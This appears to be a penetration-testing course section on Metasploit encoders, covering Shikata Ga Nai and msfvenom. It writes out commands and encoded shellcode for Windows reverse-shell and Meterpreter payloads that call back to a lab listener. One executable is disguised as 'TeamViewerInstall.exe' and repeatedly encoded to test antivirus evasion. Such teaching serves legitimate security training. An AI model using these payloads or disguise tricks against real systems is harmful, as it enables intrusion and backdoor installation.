<h3>Encoders</h3>

Over the 15 years of existence of the Metasploit Framework, Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. Encoders come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

x64	x86	sparc	ppc	mips

They are also needed to remove hexadecimal opcodes known as bad characters from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

Shikata Ga Nai (SGN) was one of the most utilized encoding schemes back in the day because it was very hard to detect payloads encoded through its mechanism. However nowadays, modern detection methods have caught up, and these encoded payloads are far from being universally undetectable anymore. The name (仕方がない) means It cannot be helped or Nothing can be done about it, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. This article from FireEye details the why and the how of Shikata Ga Nai's previous rule over the other encoders.

<h3>Selecting an Encoder</h3>

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called msfpayload and msfencode. These two tools are located in /usr/share/framework2/.

If we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 

"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .

<SNIP>

After 2015, updates to these scripts have combined them within the msfvenom tool, which takes care of payload generation and Encoding. We will be talking about msfvenom in detail later on. Below is an example of what payload generation would look like with today's msfvenom:

<h3>Generating Payload - Without Encoding</h3>

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders

Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
"\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
"\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .

<SNIP>

We should now look at the first line of the $buf and see how it changes when applying an encoder like shikata_ga_nai.

<h3>Generating Payload - With Encoding</h3>

@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

<SNIP>

<h3>Shikata Ga Nai Encoding</h3>

<img width="992" height="524" alt="image" src="https://github.com/user-attachments/assets/1ec5dab0-5639-43d7-989d-a0f743c55bc5" />

Source: https://hatching.io/blog/metasploit-payloads2/

If we want to look at the functioning of the shikata_ga_nai encoder, we can look at an excellent post here.

Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit.


msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:


@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

This will generate a payload with the exe format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.

<img width="987" height="448" alt="image" src="https://github.com/user-attachments/assets/5a205bb0-ddd7-4d2f-bc62-f51fc58af53b" />

One better option would be to try running it through multiple iterations of the same Encoding scheme:

@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders

Attempting to encode payload with 10 iterations of x86/shikata_ga_nai

<img width="984" height="453" alt="image" src="https://github.com/user-attachments/assets/202e2375-f078-49dd-aa13-b2c0f7641915" />

As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.

<h3>MSF - VirusTotal</h3>

@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe

As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion that are outside the scope of this module.

